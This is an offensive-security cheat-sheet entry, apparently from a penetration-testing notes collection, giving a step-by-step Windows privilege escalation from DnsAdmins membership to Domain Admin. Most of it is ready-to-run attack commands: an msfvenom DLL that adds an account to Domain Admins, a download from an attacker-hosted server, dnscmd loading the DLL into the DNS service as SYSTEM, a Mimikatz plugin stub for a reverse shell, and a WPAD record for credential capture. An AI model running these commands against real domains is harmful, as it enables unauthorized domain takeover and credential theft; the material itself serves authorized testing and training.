---
description: |
  The **DnsAdmins** group in Windows has elevated control over the DNS service, which can be exploited for privilege escalation. Attackers can leverage the `ServerLevelPluginDll` registry key to force the DNS service to load a custom DLL running as **NT AUTHORITY\SYSTEM**. This attack is destructive and high-impact. It requires membership in the DnsAdmins group and the ability to restart the DNS service.
  
  Attack Summary:
  - DNS management is performed over RPC.
  - The `ServerLevelPluginDll` registry key allows loading arbitrary DLLs without path validation.
  - Custom DLLs (reverse shells, Mimikatz, etc.) can be executed with SYSTEM privileges upon service restart.
  
  ⚠️ This attack should only be performed in a controlled and authorized testing environment.
  
command: |
  net group DnsAdmins /domain | net user <username> /domain

code: |
 # Step-by-Step: Privilege Escalation via DnsAdmins Group

  ## 1. Generate a Malicious DLL
  msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

  ## 2. Host the DLL on an HTTP Server
  python3 -m http.server 7777

  ## 3. Download the DLL on the Target System
  wget "http://<attacker-ip>:7777/adduser.dll" -outfile "adduser.dll"

  ## 4. Confirm Membership in the DnsAdmins Group
  Get-ADGroupMember -Identity DnsAdmins

  ## 5. Configure the DNS Service to Load the Malicious DLL
  dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

  ## 6. Verify Service Permissions (Look for RPWP — Start/Stop Permissions)
  sc.exe sdshow DNS

  ## 7. Restart the DNS Service to Trigger the DLL Injection
  sc stop dns
  sc start dns

  ## 8. Confirm Privilege Escalation
  net group "Domain Admins" /domain

  ## 9. Cleanup Registry and Restore the DNS Service
  reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f
  sc start dns

  ## 10. Confirm the DNS Service is Running
  sc query dns

  ## 11. Additional Exploitation

  # a. Utilizing Mimilib.dll (from Mimikatz) to execute reverse shell commands by editing kdns.c
  # Example custom function in kdns.c:
  /*
      DWORD WINAPI kdns_DnsPluginQuery(...) {
          FILE * kdns_logfile;
          if (kdns_logfile = _wfopen(L"kiwidns.log", L"a")) {
              klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
              fclose(kdns_logfile);
              system("ENTER REVERSE SHELL COMMAND HERE");
          }
          return ERROR_SUCCESS;
      }
  */

  # b. Creating a WPAD record and disabling the global query block list for MITM attacks
  # Disable Global Query Block List
  Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local

  # Add a WPAD Record
  Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address <attacker-ip>

  # Use tools like Responder or Inveigh to capture hashes or relay credentials

  ## 12. Cleanup Exploitation Changes

  # 1. Remove the malicious registry entry
  reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f

  # 2. Restart the DNS Service
  sc start dns

  # 3. Confirm the DNS Service status
  sc query dns

items:
  - 

services:
  - 

OS:
  - Windows

attack_types:
  - Enumeration
  - PrivEsc

references:
  - https://www.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/token-privileges
  - https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
  - https://blog.ryanwhocodes.com/dnsadmins-to-domain-admin/
  - https://blog.gentilkiwi.com (Mimikatz / mimilib)
---